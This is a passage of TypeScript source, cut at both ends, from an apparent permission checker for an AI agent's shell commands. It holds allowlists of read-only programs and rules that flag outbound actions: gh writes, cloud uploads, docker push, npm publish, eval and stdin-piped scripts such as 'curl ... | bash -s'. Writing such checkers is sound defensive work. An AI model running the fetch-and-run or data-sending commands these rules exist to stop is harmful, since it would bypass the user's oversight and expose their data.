    }
    // Writing an issue, a pull request or a release posts text under the user's own account.
    if ((sub === 'issue' || sub === 'pr') && (action === 'create' || action === 'comment' || action === 'edit')) {
      return `gh ${sub} ${action}`;
    }
    if (sub === 'release' && action === 'create') return 'gh release create';
    if (sub !== 'api') return null;
    // gh's flag parser accepts clustered shorthands: `-iftitle=x` is `--include --field title=x`
    // and `-iXPOST` is `--include --method POST`. Cut each cluster at its first field or method
    // letter so both checks see the flag it means, and any field turns the call into a POST.
    const apiArgs = args.map(arg => arg.replace(/^-[a-zA-Z]*?([fFX])/, '-$1'));
    if (sendsBody(optionValue(apiArgs, ['-X', '--method']))) return 'gh api';
    const fields = apiArgs.some(arg => /^-[fF]|^--(field|raw-field|input)(=|$)/.test(arg));
    return fields && !(action === 'graphql' && graphqlReadOnly(apiArgs)) ? 'gh api' : null;
  }
  if (name === 'aws' || name === 'gsutil' || name === 'gcloud') {
    const positional = args.filter(arg => !arg.startsWith('-'));
    const copies = positional.some(arg => /^(cp|mv|sync|rsync)$/.test(arg));
    if (copies && /^(s3|gs):\/\//.test(positional.at(-1) ?? '')) return `${program} upload`;
    return positional.includes('put-object') ? `${program} put-object` : null;
  }
  if (name === 'docker' || name === 'podman') {
    return args.find(arg => !arg.startsWith('-')) === 'push' ? `${program} push` : null;
  }
  if (name === 'deno') return args[0] === 'eval' ? 'deno eval' : null;
  if (name === 'eval') return 'eval';
  // A name built from a command substitution carries what it read into the lookup itself.
  if (RESOLVERS.has(name) && computed) return `${program} with a computed argument`;
  const windowsRun = WINDOWS_SHELLS.get(name)?.(args);
  if (windowsRun && (stdin || !windowsRun.stdin)) return `${program} ${windowsRun.shown}`;
  const inlineScript = inlineScriptOption(name);
  // A script's own arguments are not options: `python3 x.py -config` never runs an inline script.
  const { options, operands } = interpreterOptions(name, args);
  const inline = inlineScript ? options.find(arg => inlineScript.test(arg)) : undefined;
  if (inline) return `${program} ${(inlineScript?.exec(inline)?.[0] ?? inline.split('=')[0]).replace(/=$/, '')}`;
  // `bash -s` reads its script from stdin even when operands follow, as `curl ... | bash -s -- arg`.
  const scriptOperand =
    INLINE_SCRIPT.get(name) === SHELL_C && options.some(arg => /^[+-][a-zA-Z]*s/.test(arg)) ? '-' : operands[0];
  if (
    stdin &&
    STDIN_SCRIPT.test(name) &&
    (scriptOperand === undefined || scriptOperand === '-' || STDIN_SCRIPT_ARG.test(scriptOperand))
  ) {
    return `${program} reading a script from stdin`;
  }
  if ((name === 'npm' || name === 'pnpm' || name === 'yarn') && args.includes('publish')) {
    return `${program} publish`;
  }
  return null;
}

/**
 * Whether `gh api graphql`'s fields only carry a query: a GraphQL read is POSTed, so without this
 * every one of them would count as a body sent out. A mutation, a field read from a file
 * (`-F x=@path`) or `--input` is still a body.
 */
function graphqlReadOnly(args: readonly string[]): boolean {
  if (args.some(arg => /^--input(=|$)/.test(arg))) return false;
  for (let i = 0; i < args.length; i++) {
    const flag = /^(-f|-F|--field|--raw-field)(?:=(.*))?$/.exec(args[i]) ?? /^(-[fF])(.+)$/.exec(args[i]);
    if (!flag) continue;
    const value = flag[2] ?? args[++i] ?? '';
    const field = value.slice(value.indexOf('=') + 1);
    if (flag[1] !== '-f' && flag[1] !== '--raw-field' && field.startsWith('@')) return false;
    if (/\bmutation\b/.test(field)) return false;
  }
  return true;
}

/**
 * Programs that only read or write files on this computer and run no other program. Matched by
 * exact name, not basename: `./cat` is whatever the project put there.
 */
const LOCAL_PROGRAMS = new Set([
  'basename',
  'cat',
  'cmp',
  'column',
  'comm',
  'cut',
  'date',
  'diff',
  'dirname',
  'du',
  'echo',
  'egrep',
  'false',
  'fgrep',
  'file',
  'find',
  'fold',
  'grep',
  'head',
  'iconv',
  'jq',
  'ls',
  'mkdir',
  'nl',
  'paste',
  'printf',
  'pwd',
  'readlink',
  'realpath',
  'rev',
  'rg',
  'sleep',
  'sort',
  'stat',
  'tail',
  'tee',
  'test',
  'tr',
  'tree',
  'true',
  'uniq',
  'wc',
  'which',
]);

/** Options that make a listed program run another one. */
const RUNS_A_PROGRAM: Readonly<Record<string, RegExp>> = {
  find: /^-(exec|execdir|ok|okdir|delete|fprint0?|fprintf|fls)$/,
  // Not a program, but `-o` writes a file, which `sort -o` keeps out of the list too.
  iconv: /^(-[A-Za-z]*o|--o(u(t(p(ut?)?)?)?)?(=|$))/,
  rg: /^--pre(-glob)?(=|$)/,
  tree: /^-[A-Za-z]*[oR]/,
};

/**
 * Whether `sort` would write a file (`-o`, `--output`) or run one (`--compress-program`).
 * getopt_long accepts any unambiguous prefix, so `--o` and `--co` name those options too.
 * The short cluster is read properly: `-t o` and `-k o` are values, not an output flag.
 */
function sortRunsOrWrites(args: readonly string[]): boolean {
  const valueLetters = 'kStT';
  for (let i = 0; i < args.length; i++) {
    const arg = args[i];
    if (arg === '--') return false;
    if (arg.startsWith('--')) {
      const name = arg.slice(2).split('=')[0];
      if (name !== '' && ('output'.startsWith(name) || 'compress-program'.startsWith(name))) return true;
      continue;
    }
    if (!arg.startsWith('-') || arg === '-') continue;
    const cluster = arg.slice(1);
    for (let at = 0; at < cluster.length; at++) {
      if (cluster[at] === 'o') return true;
      if (valueLetters.includes(cluster[at])) {
        if (at === cluster.length - 1) i++;
        break;
      }
    }
  }
  return false;
}

/**
 * The command `timeout [options] DURATION command...` runs, or null when it cannot be read off
 * the text. The duration and option values are inert; only the wrapped command matters.
 */
function timeoutCommand(raw: readonly string[]): string[] | null {
  const at = wrapperWords('timeout', raw, 0).end;
  const duration = raw[at];
  if (duration === undefined || !/^\d+(\.\d+)?[smhd]?$/.test(unquote(duration))) return null;
  const command = raw.slice(at + 1);
  return command.length > 0 ? [...command] : null;
}

/**
 * Whether `set` only flips shell options (`set -e`, `set -euo pipefail`, `set +x`). Positional
 * arguments (`set -- a b`) are refused: later commands could read them back as `$1`.
 */
function setOnlyChangesOptions(args: readonly string[]): boolean {
  if (args.length === 0) return false;
  for (let at = 0; at < args.length; at++) {
    const arg = args[at];
    if (!/^[-+][A-Za-z]+$/.test(arg)) return false;
    if (arg.endsWith('o')) {
      at++;
      if (!/^[a-z]+$/.test(args[at] ?? '')) return false;
    }
  }
  return true;
}

/**
 * One sed script that only prints, deletes or quits over a line range: `1,45p`, `$d`, `10q`.
 * Anything else is refused, because sed's `e` command and `s///e` flag run a program and `w`
 * writes a file, and telling those apart from a substitution needs a full sed parser.
 */
const READ_ONLY_SED_SCRIPT = /^(?:(?:\d+|\$)(?:,(?:\d+|\$))?)?[pdq]$/;

/**
 * Whether a sed call only reads: `-n` and `-E`/`-r` flags, at most one inline script (bare or
 * after `-e`) of the `READ_ONLY_SED_SCRIPT` shape, then input files. No `-i`, no `-f` script file,
 * and no script the shell would expand first.
 */
function readOnlySed(raw: readonly string[]): boolean {
  let script: string | null = null;
  let at = 0;
  for (; at < raw.length; at++) {
    const arg = unquote(raw[at]);
    if (arg === '-e' || arg === '--expression') {
      if (script !== null) return false;
      script = raw[++at] ?? null;
      if (script === null) return false;
      continue;
    }
    if (/^-[nEr]+$/.test(arg) || arg === '--quiet' || arg === '--silent' || arg === '--regexp-extended') continue;
    if (arg.startsWith('-')) return false;
    break;
  }
  if (script === null) script = raw[at++] ?? null;
  if (script === null) return false;
  // `"1,$p"` is expanded by the shell before sed sees it; only a single-quoted or plain script is literal.
  if (isDynamic(script) && !script.startsWith("'")) return false;
  if (!READ_ONLY_SED_SCRIPT.test(unquote(script))) return false;
  return raw.slice(at).every(arg => !isDynamic(arg) && !unquote(arg).startsWith('-'));
}

/** Contained programs that still create or write files on their own. */
const WRITES_LOCALLY = new Set(['mkdir', 'tee']);

/** git subcommands that only report on the repository. `branch` and the rest are judged in `readOnlyGit`. */
const GIT_REPORTS = new Set([
  'blame',
  'cat-file',
  'describe',
  'diff',
  'log',
  'ls-files',
  'merge-base',
  'rev-list',
  'rev-parse',
  'shortlog',
  'show',
  'status',
]);

/**
 * Whether a git call only reports, optionally run elsewhere with `-C DIR` or `--no-pager`. Any
 * other global option (`-c`, `--git-dir`, `--exec-path`) is refused, as are `--output` and
 * `--ext-diff`. Repository config can still name a program, which is why this decides only
 * whether a worktree may read its own main checkout, which shares that config, never containment.
 */
export function readOnlyGit(raw: readonly string[]): boolean {
  if (raw.length === 0 || raw.some(isDynamic)) return false;
  const tokens = raw.map(unquote);
  if (tokens[0] !== 'git') return false;
  let at = 1;
  while (at < tokens.length && tokens[at].startsWith('-')) {
    if (tokens[at] === '-C') at += 2;
    else if (tokens[at] === '--no-pager') at++;
    else return false;
  }
  const [subcommand, ...args] = tokens.slice(at);
  if (subcommand === undefined) return false;
  if (args.some(arg => /^--(output|ext-diff|open-files-in-pager)(=|$)/.test(arg) || /^-O/.test(arg))) return false;
  if (GIT_REPORTS.has(subcommand)) return true;
  if (subcommand === 'branch') {
    return args.every(arg => /^(--show-current|--list|-[alrv]+|--all|--remotes|--verbose|--no-color)$/.test(arg));
  }
  if (subcommand === 'remote') return args.every(arg => arg === '-v' || arg === '--verbose');
  if (subcommand === 'worktree' || subcommand === 'stash') return args[0] === 'list';
  return false;
}

function onlyReads(raw: readonly string[]): boolean {
  const command = unquote(raw[0] ?? '') === 'timeout' ? timeoutCommand(raw.slice(1)) : raw;
  if (!command || command.length === 0) return false;
  return (containedCommand(command) && !WRITES_LOCALLY.has(unquote(command[0]))) || readOnlyGit(command);
}

/** gh subcommands that only read from GitHub. `api` is judged on its own in `readOnlyGh`. */
const GH_READS: Readonly<Record<string, ReadonlySet<string>>> = {
  pr: new Set(['checks', 'diff', 'list', 'status', 'view']),
  issue: new Set(['list', 'status', 'view']),
  run: new Set(['list', 'view', 'watch']),
  repo: new Set(['view']),
  release: new Set(['list', 'view']),
  workflow: new Set(['list', 'view']),
  search: new Set(['code', 'commits', 'issues', 'prs', 'repos']),
};

/**
 * Whether a gh call only reads from github.com. Any other host is refused, whichever way it is
 * named: `--hostname`, a URL argument, or a `-R HOST/OWNER/REPO`.
 */
function readOnlyGh(args: readonly string[]): boolean {
  if (args.some(arg => /^--hostname(=|$)/.test(arg) || arg === '--web' || arg === '-w')) return false;
  if (args.some(arg => arg.includes('://') && !arg.startsWith('https://github.com/'))) return false;
  const repo = optionValue(args, ['-R', '--repo']);
  if (repo !== undefined && repo.split('/').length > 2 && !repo.startsWith('github.com/')) return false;
  const [sub, action] = args.filter(arg => !arg.startsWith('-'));
  if (sub === 'api') {
    return outboundReason(['gh', ...args]) === null && !args.some(arg => /^--input(=|$)/.test(arg));
  }
  return own(GH_READS, sub)?.has(action) === true;
}

/** Environment variables that only tune a run's output or parallelism. Any other name in front of a command makes it uncoverable. */
const TUNING_VARIABLE = /^(CI|NODE_ENV|FORCE_COLOR|NO_COLOR|TZ|DEBUG|LANG|LC_[A-Z]+|VITEST_MAX_WORKERS)$/;

/**
 * Whether a `NAME=value` in front of a command only tunes it (`CI=1`, `VITEST_MAX_WORKERS=25%`):
 * the name is in TUNING_VARIABLE and the value is literal, so it neither runs a
 * command substitution nor carries what one read.
 */
function harmlessAssignment(name: string, value: string): boolean {
  return TUNING_VARIABLE.test(name) && !isDynamic(value);
}

/** Task names a package script or turbo pipeline runs under for testing, checking or building. */
const DEV_TASK_WORDS = new Set([
  'test',
  'tests',
  'spec',
  'unit',
  'e2e',
  'integration',
  'typecheck',
  'types',
  'tsc',
  'lint',
  'eslint',
  'stylelint',
  'format',
  'fmt',
  'prettier',
  'build',
  'compile',
  'check',
  'verify',
  'validate',
  'coverage',
  'vitest',
  'jest',
]);

/** A task named for any of these reaches past this computer, whatever else its name says. */
const OUTBOUND_TASK_WORDS = new Set(['deploy', 'release', 'publish', 'push', 'upload', 'sync', 'ship']);

/** `test`, `turbo:typecheck`, `lint:check` - but not `deploy:build`. */
function devTask(name: string): boolean {
  const parts = name.toLowerCase().split(/[:._/-]+/);
  return parts.some(part => DEV_TASK_WORDS.has(part)) && !parts.some(part => OUTBOUND_TASK_WORDS.has(part));
}

/** Package-manager options that only pick which packages a task runs in, or how it prints. */
const PACKAGE_FLAGS = new Set([
  '-r',
  '--recursive',
  '--parallel',
  '--stream',
  '-w',
  '--workspace-root',
  '-s',
  '--silent',
  '--if-present',
]);

/** Options that open a server or debugger port a page could then talk to. */
const VITEST_SERVES = /^--(browser([.=]|$)|(browser\.)?(api|ui|open|inspect|inspect-brk|host)([.=]|$))/;

/** Turbo options that read from or write to a remote cache. */
const TURBO_REMOTE = /^--(api|token|team|login|cache|remote-only|remote-cache-read-only|preflight)(=|$)/;

/** Node options that change nothing about what it loads; `--require`, `--import` and `-e` are not here. */
const NODE_FLAGS =
  /^--(test|test-only|test-(name-pattern|skip-pattern|concurrency|timeout|shard)=.+|enable-source-maps|no-warnings|trace-warnings|trace-uncaught|experimental-(strip-types|transform-types|vm-modules)|max-old-space-size=\d+|stack-size=\d+)$/;

/** A relative path that does not climb out of the folder it is resolved against. */
function staysInFolder(path: string): boolean {
  return !isAbsolute(path) && !path.startsWith('~') && !STDIN_SCRIPT_ARG.test(path) && !path.split('/').includes('..');
}

function devTool(tokens: readonly string[]): boolean {
  const [program, ...args] = tokens;
  switch (program) {
    case 'tsc':
    case 'jest':
    case 'prettier':
      return true;
    case 'eslint':
      return !args.includes('--init');
    case 'vitest':
      return args[0] !== 'init' && !args.some(arg => VITEST_SERVES.test(arg));
    case 'turbo': {
      const rest = args[0] === 'run' ? args.slice(1) : args;
      const firstOption = rest.findIndex(arg => arg.startsWith('-'));
      const tasks = firstOption === -1 ? rest : rest.slice(0, firstOption);
      return tasks.length > 0 && tasks.every(devTask) && !rest.some(arg => TURBO_REMOTE.test(arg));
    }
    case 'node': {
      const script = args.findIndex(arg => !arg.startsWith('-'));
      const options = script === -1 ? args : args.slice(0, script);
      if (!options.every(option => NODE_FLAGS.test(option))) return false;
      return script === -1 ? options.includes('--test') : staysInFolder(args[script]);
    }
    default:
      return false;
  }
}

/** `pnpm exec vitest`, `npx tsc`: the tool after an optional `--`, with no options of the runner's own. */
function execTool(args: readonly string[]): boolean {
  return devTool(args[0] === '--' ? args.slice(1) : args);
}

function packageTask(manager: string, args: readonly string[]): boolean {
  let at = 0;
  while (at < args.length && args[at].startsWith('-')) {
    const name = args[at].split('=')[0];
    if (PACKAGE_VALUE_OPTIONS.includes(name)) at += args[at].includes('=') ? 1 : 2;
    else if (PACKAGE_FLAGS.has(name)) at += 1;
    else return false;
  }
  const [sub, ...rest] = args.slice(at);
  if (sub === undefined) return false;
  if (sub === 'exec' || (manager === 'npm' && sub === 'x')) return execTool(rest);
  if (sub === 'run' || sub === 'run-script') return rest[0] !== undefined && devTask(rest[0]);
  if (sub === 'test' || sub === 't' || sub === 'tst') return true;
  // npm runs no script by its bare name; pnpm and yarn run the script, or else a local binary.
  if (manager === 'npm') return false;
  return devTool([sub, ...rest]) || devTask(sub);
}

/**
 * Whether a command is an ordinary local test, typecheck, lint, format or build run: `vitest`,
 * `jest`, `tsc`, `eslint`, `prettier`, a dev-task `turbo` pipeline or a `node` script inside the
 * folder, directly or through `pnpm`/`npm`/`yarn`/`npx`, with no option that opens a port, reads a
 * remote cache or installs a package. Only decides whether a tuning env prefix keeps the command
 * coverable. It is NOT contained: these run code the project defines, which a tainted reply can
 * write unasked first, so running one is the barrier the taint check keeps.
 */
function localToolchainCommand(raw: readonly string[]): boolean {
  if (raw.length === 0 || raw.some(isDynamic)) return false;
  const [program, ...args] = raw.map(unquote);
  if (program === 'pnpm' || program === 'npm' || program === 'yarn') return packageTask(program, args);
  if (program === 'npx') {
    const start = args.findIndex(arg => !/^--(no-install|no|offline)$/.test(arg));
    return start !== -1 && execTool(args.slice(start));
  }
  return devTool([program, ...args]);
}

/**
 * Whether one simple command provably keeps to this computer, or only reads from GitHub as the
 * user. Deliberately an allowlist: anything it does not recognise - an interpreter, a build tool,
 * a wrapper that runs another program - is not contained. `git` is not on it: a repository's own
 * config can name a program for `status`, `diff` and the rest to run (`core.fsmonitor`,
 * `filter.*.clean`, `diff.external`), and no scan of the argv can rule that out.
 */
export function containedCommand(raw: readonly string[]): boolean {
  if (raw.length === 0) return false;
  const tokens = raw.map(unquote);
  const [program, ...args] = tokens;
  if (isDynamic(raw[0])) return false;
  if (program === 'timeout') {
    const command = timeoutCommand(raw.slice(1));
    return command !== null && containedCommand(command);
  }
  if (program === 'set') return setOnlyChangesOptions(args);
  if (program === 'sed') return readOnlySed(raw.slice(1));
  if (LOCAL_PROGRAMS.has(program)) {
    if (program === 'sort') return !sortRunsOrWrites(args);
    const runs = own(RUNS_A_PROGRAM, program);
    return !runs || !args.some(arg => runs.test(arg));
  }
  // A computed argument can carry what it read into the request path itself.
  if (program === 'gh') return !raw.slice(1).some(isDynamic) && readOnlyGh(args);
  return false;
}

export function words(node: Node): string[] {
  const out: string[] = [];
  for (const child of node.namedChildren) {
    if (!child || child.type === 'variable_assignment' || child.type.endsWith('redirect') || child.type === 'comment') {
      continue;
    }
    out.push(child.text);
  }
  return out;
}

/** Nodes whose assignments are already accounted for: a command's prefix, or a flagged declaration. */
const ASSIGNMENT_OWNERS = new Set(['command', 'declaration_command', 'variable_assignments']);

/**
 * The home folder `~` and a bare `cd` reach, and the temp folders a command may use freely. A
 * command in a WSL folder runs in Linux, so they are the distro user's: `home` is its Linux path,
 * and the temp folder is on the share. When the distro cannot say (yet), `known` is false and
 * `home` is the distro's root: a path built from it is not where the command will run, so
 * `scanShell` gives no scan for a script that uses it.
 */
export async function shellHome(startDirectory: string): Promise<{ home: string; known: boolean; temp: string[] }> {
  const wsl = wslLocation(startDirectory);
  if (!wsl) return { home: homedir(), known: true, temp: [tmpdir(), '/tmp', '/private/tmp'] };
  const user = await wslUserEnvironment(wsl.distro);
  return { home: user?.home ?? '/', known: !!user, temp: [wslUncPath(wsl, '/tmp')] };
}

/** `join`, `basename` and `dirname` for operands of a command in `cwd`: Linux ones in a WSL folder. */
const operandRules = (cwd: string) => (wslLocation(cwd) ? posix : { join, basename, dirname });

/**
 * A program a WSL command runs through Windows interop: one named as Windows runs it, or any file
 * on a Windows drive, since interop runs a Windows executable by its content whatever its name.
 */
const WINDOWS_PROGRAM = /\.(exe|com|bat|cmd)$|^\/mnt\/[A-Za-z]\//i;

/** A path in a WSL distro that none of `roots` is in. */
export function inUngrantedDistro(path: string, roots: readonly string[]): boolean {
  const distro = wslLocation(path)?.distro.toLowerCase();
  return distro !== undefined && !roots.some(root => wslLocation(root)?.distro.toLowerCase() === distro);
}

/**
 * Where an operand itself sits, a final link unfollowed: its parent's physical path plus its name.
 * `rm`, `mv`, `ln -sf` and `unlink` act on the link, not its target. Throws when a parent cannot be resolved.
 */
async function ownPlaces(
  operand: string,
  cwd: string,
  roots: readonly string[],
  reader: OperandReader = 'program'
): Promise<string[]> {
  const rules = reader === 'windows' ? win32 : operandRules(cwd);
  const name = rules.basename(operand);
  if (name === '' || name === '.' || name === '..') return [];
  const places: string[] = [];
  for (const { lexical, physical } of await operandPlaces(rules.dirname(operand), roots, cwd, reader)) {
    if (inUngrantedDistro(lexical, roots) || (physical === null && onAnotherComputer(lexical))) continue;
    if (physical === null) throw new PathAccessDenied(operand);
    places.push(join(physical, name));
  }
  return places;
}

/**
 * Every simple command a shell script would run, and every directory outside the project it
 * names. Null when the script does not parse, which the caller treats as a reason to ask.
 *
 * `cd`, `pushd` and `popd` move the directory later commands resolve against, except inside a
 * subshell, a `$( )` or a pipeline, where the shell discards the move. An argument built from a
 * variable or a command substitution is skipped, as opencode does: it cannot be read off the
 * text, and a `cd` to one leaves the tracked directory where it was.
 */
export async function scanShell(
  command: string,
  startDirectory: string,
  roots: readonly string[]
): Promise<ShellScan | null> {
  const tree = await parseBash(command);
  if (!tree) return null;

  try {
    const { home, known: homeKnown, temp } = await shellHome(startDirectory);
    let homeGuessed = false;
    const expand = (text: string): string => {
      const expanded = expandHome(text, home);
      if (!homeKnown && expanded !== text) homeGuessed = true;
      return expanded;
    };
    const allowed = [...roots, ...temp];
    const commands: ShellCommand[] = [];
    const paths = new Set<string>([await realpathNearest(startDirectory)]);
    const globFolders = new Set<string>();
    const dotlessGlobFolders = new Set<string>();
    const dotGlob = MAY_SET_DOTGLOB.test(command);
    // Links `ln -s` makes in this script, in guard form: the scan cannot follow one that does not exist yet.
    const createdLinks = new Set<string>();
    // Folders whose `.claude` holds settings this session may load: its own and each shared root's.
    const settingsBases = await Promise.all([startDirectory, ...roots].map(base => realpathNearest(base)));
    // Path operands (file commands, redirects, cd) a variable or substitution decides; their command is never coverable.
    let unreadOperands = 0;
    const directories = new Set<string>();
    const ungranted = new Set<string>();
    const envFiles = new Set<string>();
    const outbound = new Set<string>();
    const sends: ShellScan['sends'] = [];
    let setsEnvironment = false;
    const writtenCommands = new Set<number>();
    const writes = new Set<string>();
    const writtenTrees = new Set<string>();
    let contained = true;
    let readOnly = true;

    const noteEnvFile = (raw: string): void => {
      const path = expand(unquote(raw));
      if (isDynamic(path)) return;
      if (globPrefix(path) === path ? isEnvFile(path) : globMayMatchEnvFile(path)) envFiles.add(path);
    };

    const scope = (): WordScope => {
      const shellPath = (path: string): string => wslLocation(path)?.linuxPath ?? path;
      return {
        home,
        cwd: shellPath(state.cwd),
        previous: shellPath(state.previous),
        homeUsed: () => {
          if (!homeKnown) homeGuessed = true;
        },
      };
    };

    /**
     * Records `folder` as reached whole, and a write there as reaching the settings of a session folder in it.
     * `dotless` when only names without a leading dot are reached directly under it.
     */
    const reachFolder = async (folder: string, dotless: boolean, reach: Reach | null): Promise<void> => {
      (dotless ? dotlessGlobFolders : globFolders).add(folder);
      if (reach !== 'write') return;
      const form = guardForm(folder);
      for (const base of settingsBases) {
        const settings = join(base, '.claude');
        const target = guardForm(settings);
        if (!guardFormWithin(form, target) || form === target) continue;
        if (dotless && target.slice(form.length).replace(/^\/+/, '').startsWith('.')) continue;
        paths.add(settings);
      }
      if (!dotless && (await lstat(join(folder, '.claude')).catch(() => null))) paths.add(join(folder, '.claude'));
    };

    /** Whether `operand` lies within a link this script made, whose target the scan cannot read. */
    const underCreatedLink = (cwd: string, operand: string, reader: OperandReader): boolean =>
      createdLinks.size > 0 &&
      operandTargets(cwd, operand, reader).some(target =>
        [...createdLinks].some(link => guardFormWithin(link, guardForm(target)))
      );

    /** One word's glob shape and the folder it reaches, moved up for each component that can walk up. */
    const shapeOf = (
      word: OperandWord,
      operand: ReadOperand,
      rules: { dirname: (path: string) => string },
      windows: boolean
    ): { shape: GlobShape | null; folder: string } => {
      const shape =
        operand.start === null || operand.unread
          ? null
          : globShape(word, operand.start, dotGlob, windows ? /[\\/]/ : /\//);
      let folder = operand.path;
      for (let up = 0; up < (shape?.up ?? 0); up++) folder = rules.dirname(folder);
      return { shape, folder };
    };

    /**
     * A `probe` only reads, so a toolchain folder it names is recorded as a path, not an outside folder to grant.
     * Returns where the command lands, which is what a `cd` moves to.
     */
    const check = async (
      raw: string,
      cwd: string,
      probe = false,
      reader: OperandReader = 'program',
      reach: Reach | null = null
    ): Promise<string | null> => {
      if (reader === 'windows') {
        const [device, text] = windowsDevicePath(raw);
        return checkWord(literalWord(text), device, cwd, probe, reader, reach);
      }
      const words = operandWords(raw, scope());
      if (words === null) {
        unreadOperands++;
        return null;
      }
      let landed: string | null = null;
      for (const word of words) landed ??= await checkWord(word, '', cwd, probe, reader, reach);
      return landed;
    };

    const checkWord = async (
      word: OperandWord,
      device: string,
      cwd: string,
      probe: boolean,
      reader: OperandReader,
      reach: Reach | null
    ): Promise<string | null> => {
      const { text } = word;
      if (text === '') return null;
      const rules = reader === 'windows' ? win32 : operandRules(cwd);
      const operand = readOperand(word, rules.dirname);
      if (operand.unread) unreadOperands++;
      const { shape, folder } = shapeOf(word, operand, rules, reader === 'windows' || sep === '\\');
      const prefix = device + folder;
      if (underCreatedLink(cwd, prefix, reader)) unreadOperands++;
      const named = operand.start === null ? prefix : device + text.slice(0, operand.start);
      // A glob can expand to `..` (`~/.nvm*/../.ssh`, `~/.nvm/.?/.ssh`), so a dot after the glob never stays inside.
      const stays =
        operand.start === null || (!operand.unread && !text.slice(operand.start).includes('.') && !named.endsWith('.'));
      const dotless = shape?.dotless === true;
      const reached = async (place: string): Promise<void> => {
        if (operand.start !== null) await reachFolder(place, dotless, reach);
        else if (reach) await reachFolder(place, false, reach);
        if (shape?.namesSettings) paths.add(join(place, '.claude'));
      };
      const places = await operandPlaces(prefix, allowed, cwd, reader);
      let own = false;
      for (const { lexical, physical, inside } of places) {
        if (inUngrantedDistro(lexical, allowed)) {
          // Outside without a look: reading it over the share would start that distro.
          ungranted.add(lexical);
        } else if (inside && physical !== null) {
          paths.add(physical);
          if (operand.start === null) own = true;
          await reached(physical);
        } else {
          await reached(lexical);
          paths.add(lexical);
          // Named without a look, so the scan opens no connection to that computer.
          if (physical === null && onAnotherComputer(lexical)) {
            directories.add(dirname(lexical));
            continue;
          }
          paths.add(await realpathNearest(lexical));
          if (probe && stays && (await isToolchainPath(named, cwd, home))) continue;
          const isDirectory = (await stat(lexical).catch(() => null))?.isDirectory() === true;
          directories.add(isDirectory ? lexical : dirname(lexical));
        }
      }
      if (own) for (const place of await ownPlaces(prefix, cwd, allowed, reader)) paths.add(place);
      const landed = places[0];
      return landed?.inside && landed.physical !== null ? landed.physical : (landed?.lexical ?? null);
    };

    const state = { cwd: startDirectory, previous: startDirectory, stack: [] as string[] };

    const run = async (node: Node): Promise<void> => {
      const unreadBefore = unreadOperands;
      for (const child of node.children) {
        if (child && child.type !== 'command_name') await visit(child);
      }

      const tokens = node.children.some(child => child?.type === 'command_name') ? words(node) : [];
      if (tokens.length === 0) return;
      const [program, ...rest] = tokens;
      const [wrapped, ...wrappedRest] = withoutWrappers(tokens);
      if (wrapped !== undefined) noteWrites(wrapped, wrappedRest);
      const inPlace = await inPlaceWrites(withoutWrappers(tokens.map(unquote)), node, state.cwd);
      for (const file of inPlace.files) noteWrite(file);
      for (const tree of inPlace.trees) noteWrite(tree, writtenTrees);

      if (CHANGES_DIRECTORY.has(program)) {
        // Later operands resolve against a folder the scan cannot name, so no prefix rule covers the script.
        if (await changeDirectory(program, rest)) {
          commands.push({ text: node.text, always: node.text, coverable: false, words: node.text });
        }
        return;
      }

      const normalised = commandTokens(tokens);
      const assignments = node.namedChildren.filter(child => child?.type === 'variable_assignment');
      // A tuning variable in front of a toolchain run is not unsafe syntax for a remembered
      // pattern or a rule; every other assignment is.
      const assigns =
        assignments.length > 0 &&
        !(
          localToolchainCommand(tokens) &&
          assignments.every(
            child =>
              child !== null &&
              harmlessAssignment(
                child.childForFieldName('name')?.text ?? '',
                child.childForFieldName('value')?.text ?? ''
              )
          )
        );
      const writes = writtenCommands.has(node.id) || hasWriteRedirect(node);
      const arithmetic = tokens.some(token => EVALUATES_ARITHMETIC.test(token));
      const opaque = opaqueForm(tokens);
      const name = programName(unquote(wrapped ?? ''));
      const coverable =
        !assigns && !writes && !arithmetic && droppedOnlySafeOptions(tokens) && !runsOpaqueScript(name, wrappedRest);
      // Exact rules must name the unsafe syntax too: dropping an assignment or output redirect
      // would let `Bash(git status)` cover `GIT_CONFIG_PARAMETERS=... git status` or a file write.
      const original = node.parent?.type === 'redirected_statement' ? node.parent.text : node.text;
      const entry: ShellCommand = {
        text: normalised.join(' '),
        always: `${arityPrefix(normalised).join(' ')} *`,
        coverable,
        // A harmless assignment stays in `words` so a deny or ask rule naming it still matches.
        words: coverable ? [...assignments.map(child => child?.text ?? ''), ...tokens].join(' ') : original,
        ...(opaque ? { opaque } : {}),
      };
      commands.push(entry);
      const reason = outboundReason(tokens, readsStdin(node));
      if (reason) {
        outbound.add(reason);
        const computed = tokens.some(isDynamic);
        sends.push({ reason, target: assigns || computed ? null : repositoryWrite(tokens.map(unquote), state.cwd) });
      }
      // wslconfig is the legacy tool for WSL itself (`/u` unregisters a distro, `/t` stops one).
      if (programName(unquote(withoutWrappers(tokens)[0] ?? '')) === 'wslconfig') ungranted.add(WSL_MANAGEMENT);
      for (const { distros, system, managing } of wslRuns(tokens)) {
        if (managing) {
          ungranted.add(WSL_MANAGEMENT);
          continue;
        }
        if (system) {
          ungranted.add(SYSTEM_DISTRO);
          continue;
        }
        for (const distro of distros) {
          const root = distro === undefined ? UNNAMED_DISTRO : wslUncPath({ host: 'wsl.localhost', distro }, '/');
          if (distro === undefined || inUngrantedDistro(root, allowed)) ungranted.add(root);
        }
      }
      for (const file of ghReadFiles(tokens.map(unquote))) await check(file, state.cwd);
      if (reason || assigns || arithmetic || !containedCommand(tokens)) contained = false;
      if (
        reason ||
        assigns ||
        arithmetic ||
        writes ||
        inPlace.files.length > 0 ||
        inPlace.trees.length > 0 ||
        !onlyReads(tokens)
      ) {
        readOnly = false;
      }
      for (const arg of rest) if (!arg.startsWith('-')) noteEnvFile(arg);
      for (const directory of directoryOptionValues(tokens)) await check(directory, state.cwd);
      const trees = treeOperands(name, wrappedRest);
      const wrapperWordCount = rest.length - wrappedRest.length;
      const reachAt = (index: number): Reach | null => trees.operands.get(index - wrapperWordCount) ?? null;
      if (!TOUCHES_FILES.has(program)) {
        const here = wslLocation(state.cwd);
        const windowsProgram = here !== null && WINDOWS_PROGRAM.test(wordValue(wrapped ?? ''));
        const patterns = patternWords(name, wrappedRest);
        // Programs outside the folder-discovery list can still name permission files (sed,
        // awk, dd, ...). Record static operands for the permission-file floor too, including
        // option values, without treating every ordinary argument as an outside folder grant.
        for (const [index, arg] of rest.entries()) {
          // A Windows program run through interop opens a Windows path where Windows would, so that place is
          // judged, for the word bash passes and for the part after an `=` in it.
          if (windowsProgram) {
            const word = wordValue(arg);
            const passed = [...new Set([word, word.slice(word.indexOf('=') + 1)])].filter(
              part => !part.startsWith('-') && /^[A-Za-z]:|^[\\/]{2}|\\/.test(part)
            );
